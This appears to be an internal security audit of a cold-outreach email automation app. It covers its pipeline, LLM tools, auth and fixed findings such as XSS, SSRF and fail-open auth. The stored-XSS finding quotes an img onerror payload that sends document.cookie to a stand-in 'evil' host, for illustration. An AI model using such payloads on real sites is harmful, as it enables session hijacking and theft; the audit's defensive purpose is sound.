00 Overview

What this app is, in one breath.

A single-operator B2B cold-outreach autopilot. It scrapes local businesses from Google Places, enriches them (email discovery + AI research + fit scoring), enrolls qualifying leads into a self-improving 7-step email drip sent through Resend, tracks opens/clicks/replies, and uses an epsilon-greedy bandit to learn which subject angles convert. Replies are polled from Gmail, classified by AI, and drafted for human review.

The one thing to internalize There are two parallel apps in this repo. api/index.py is the deployed production app (Vercel rewrites all traffic to it) — authenticated, Supabase-backed. src/web/app.py (3147 lines, 66 routes) is a local-only dev app with a legacy SQLite engine — richer UI, but no auth guard and a racy sequencer. Much of the risk lives in the legacy app, but production is not clean either — F03 (stored XSS), F04 (PII in git), F08/F12 (fail-open auth) all hit the deployed path. Every finding below is labelled with which app it affects; keep the two straight.

02 Deployment topology

03 Lead pipeline

End-to-end lifecycle: pin → booked call. Each stage names its trigger and the code that runs it.

1 · Scrapeuser /scrape · SSE
Google Places Text Search loops niche×region. lib/scrape.py:search_places → normalize → insert Supabase leads (status pending).
↓
2 · Enrichenrich_tick · 15min
Waterfall per lead: email discovery (site crawl + MX) → AI research (signals/pain/intent 0–100) → fit score → email-quality classify. email_finder · lib/enrich · fitcheck · email_quality → status enriched, upsert leads_master.
↓
3 · Enrollauto or manual
Enriched leads in active campaigns get a sequences row (step 0, next_send_at=now). Campaigns are paused by default — operator must flip active=true.
↓
4 · Draft + Sendsequencer_tick · 5min
Atomic claim-lock → engagement tier → epsilon-greedy angle pick (10 angles) → per-step instruction set → OpenAI draft (bans em/en dashes, website claims) → Resend send → log sequence_events. lib/sequence.py · api/cron/sequencer_tick.py
↓
5 · TrackResend webhook + sync
Opens/clicks/bounces via /webhook/resend (Svix) → Supabase sync. 30s bot-filter on opens so the bandit isn't trained on spam scanners.
↓
6 · Reply AIreplies_tick · 15min
Poll Gmail label → match to lead → classify intent (interested/objection/not_now/stop/other) → draft reply for human review. STOP-intent → insert suppressions + pause. lib/gmail_replies · lib/reply_ai
↓
7 · Learnlearning_tick · nightly
Aggregate opens/clicks per angle (Laplace-smoothed, 90d window) → upsert angle_performance. Sequencer biases future sends to top-3 angles. lib/learning.py
Engagement gating Steps 1–3 go to everyone. Step 4+ requires ≥1 confirmed open (open-gate). Past step 7, an engaged-loop keeps nurturing on a slow 4-day cadence, stops after 21 days of no opens, hard cap 15 touches ever. Daily cap 120.

07 AI / LLM layer

Single provider (OpenAI). Two call shapes; only one has tools.

chat_json — the workhorse

JSON-mode completion, no tools. Drives drafting, reply classification, signal extraction, scoring. Lead-supplied text (reply bodies, scraped names) flows in here — worst case is a corrupted draft a human still reviews. lib/llm.py:35

chat_tools — the agent

Function-calling loop (max 8 rounds). Tools: scrape_and_enrich_leads · list_leads · schedule_leads. No email-send tool exists. Only wired into the local-only /agent chat. lib/llm.py:85 · agent_tools.py

Injection reality The only tool-calling loop is isolated from the untrusted reply pipeline and runs solo in a dev app. schedule_leads enrolls into a paused-by-default sequencer (no synchronous send) and its confirm-gate is prompt-level only. Real exposure appears only if /agent is ever deployed publicly — see F11/F12.

08 Auth & users

Three operators (khush · vineet · amaan), shared data, per-user From + signature.

  • Production gate — api/index.py @app.before_request checks a signed uid cookie on every path but /healthz /login /logout.
  • Passwords — LEADGEN_USERS JSON; verified with hmac.compare_digest over PBKDF2-SHA256 (lib/users.py:78). Timing-safe.
  • Cookie — HMAC-SHA256 signed with LEADGEN_SECRET; set httponly · secure · SameSite=Lax, 30-day TTL (api/index.py:101).
  • Secret fallback — _secret() falls back to DASHBOARD_KEY then a static "dev-secret" (lib/users.py:131). If both env vars are unset in prod, cookies are forgeable → F06.
  • Session key — FLASK_SECRET_KEY required in prod; random fallback only in debug (invalidates sessions on serverless cold start).

CritF02 No test-mode / dry-run recipient override anywhere in the send path Fixed▸
Where
src/web/resend_send.py:17,30 and lib/sequence.py:749-812 — both send unconditionally to the lead's real address. Grep for test_mode/dry_run/sandbox/resend.dev = zero hits.

CritF03 Stored XSS in the production dashboard — scraped data rendered unescaped Fixed▸
Where
api/index.py:1915 (campaign_detail) and api/index.py:2037-2038 (sequence_detail) interpolate l['business'], l['email'], d['subject'], d['body'] into raw Python f-string HTML. The production app renders all HTML via f-strings with no template engine and no autoescaping.

This is production, not the local app. A Google Business Profile named <img src=x onerror=fetch('//evil/?c='+document.cookie)> is pulled straight in by the daily_scrape cron and executes in the logged-in operator's session when they open the campaign — same-origin, so it can drive any action (send emails, export leads) directly, bypassing SameSite. Also reachable via CSV upload. The /replies view escapes correctly with html.escape — these sites were missed.
Fix
Wrap every lead/CSV/LLM-sourced value in html.escape() (match the /replies pattern) across campaign_detail, sequence_detail, leads_page, compose_page. Better: migrate this 2268-line file to Jinja2 with autoescaping so a single missed field can't reintroduce it.
Applied
2026-07-06 — added module-level _esc() helper and wrapped all unescaped lead/business/email/subject/body/angle/offer sites (dashboard activity rows, campaign list & detail, offer brief, sequences list, sequence-detail thread). Verified no residual unescaped biz/email interpolations remain. Full Jinja2 migration still advisable long-term.

HighF06 Legacy engine sends without checking the suppression list Fixed▸
Where

HighF07 CAN-SPAM: no unsubscribe link, header, or physical address in any email Fixed (set address env)▸
Where
Signatures in lib/sequence.py:716-722 and src/web/email_compose.py carry only name/title/website. No List-Unsubscribe header, no one-click link, no postal address. No /unsubscribe route exists in either app.

HighF08 Fail-open auth: cron, webhook & login default to open when env unset Fixed▸
Where

HighF09 SSRF: lead-controlled website URLs fetched with no host/IP validation Fixed▸
Where
lib/enrich.py:39-47, lib/email_finder.py:44-51, src/web/email_finder.py:47-65 — all requests.get(url, allow_redirects=True) on a website field harvested from Google Places / DDG. No scheme allowlist, no private-IP block, no per-redirect re-validation.

HighF28 Manual send path bypassed suppression, daily cap, and idempotency Fixed (2026-07-20)▸
Where
api/index.py compose_send / replies_send → lib/sequence.py send_manual. Suppression was enforced only in api/cron/sequencer_tick.py; the composer looped recipients with no cap and no Idempotency-Key.
Exploit

Fix

Related hardening: migration 011_campaigns_paused_default.sql makes campaigns.active default false at the schema level (N1 was app-code-only) — apply in Supabase. Dashboard now warns when LEADGEN_POSTAL_ADDRESS is unset.

11 What's solid

The production posture is genuinely good in these areas — don't regress them.

  • Production auth — global before_request gate, PBKDF2 passwords, HMAC cookies (httponly · secure · SameSite=Lax), timing-safe compares.
  • Production sequencer — atomic compare-and-swap claim-lock; the 70-dup incident's failure mode is closed on the cron path.
  • Production suppression — gated before every send; closed-loop Gmail STOP → suppressions → read each tick. Since v1.6 also enforced fail-closed inside send_manual/send_email, so manual composer/reply sends can never bypass it (F28).
  • Secrets hygiene — .env properly gitignored, never committed; no AWS keys; no verify=False anywhere.
  • Security headers — X-Frame-Options: DENY, nosniff, XSS-protection, referrer policy set globally.
  • Least privilege — Gmail scope is readonly; LLM tool registry exposes no email-send tool.
  • Webhook verification — Svix signature check present on Resend (when secret is set — see F06).
  • Login inputs HTML-escaped — api/index.py escapes username/error/account fields.
